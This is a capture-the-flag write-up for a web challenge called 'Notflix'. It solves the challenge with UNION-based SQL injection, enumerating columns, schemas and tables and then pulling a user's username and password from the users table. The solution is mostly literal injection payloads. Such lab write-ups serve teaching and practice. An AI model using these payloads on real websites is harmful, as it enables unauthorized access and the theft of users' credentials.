# Notflix

## Description
Welcome to Notflix. You can search for movies here and the Top 3 will be shown. You can also login to watch the movies!
Your task is to login as Eric Law.

## Solution
1. Upon pressing the 'Find Movies' button you will come to realise we can only see the first three rows of the table.
   
2. Let's also confirm that there are only two columns to begin with. When we enter the sql injection `' order by 3-- -`, we still do not see any errors. When we enter `' order by 4-- -`, we finally get an error. It appears there are 3 columns, but we can only see 2 of them.
   
3. Let's check which columns we are seeing. By entering `cn' UNION select 1,2,3-- -`, we can see that only the second and third columns are being displayed.
   
4. With this information, we can start exploring the database.

     `cn' UNION select 1,schema_name,3 from INFORMATION_SCHEMA.SCHEMATA-- -`

   There are 2 schemas: Information_schema and public

     `cn' UNION select 1,GROUP_CONCAT(TABLE_NAME  SEPARATOR ' , '),3 from INFORMATION_SCHEMA.TABLES where table_schema='INFORMATION_SCHEMA'-- -`

   It appears there isn't any useful tables in information_schema. Let's try the same injection on the public schema.

   `cn' UNION select 1,GROUP_CONCAT(TABLE_NAME  SEPARATOR ' , '),3 from INFORMATION_SCHEMA.TABLES where table_schema='PUBLIC'-- -`

   Maybe we can use the users table to find Eric Law's username and password.

   `cn' UNION select 1,GROUP_CONCAT(COLUMN_NAME  SEPARATOR ' , '),3 from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -`

   We can use the following commands to find Eric's login information: firstname, username, password

6. Let's find Erics information! Use `cn' UNION select 1, username ||', '|| password, 4 from public.users where firstname='Eric'-- -`

    <img width="340" alt="image" src="https://github.com/swaathiLaks/Mimosa-Solutions/assets/113973466/682eae12-220d-411e-a696-c040924bc0c1">
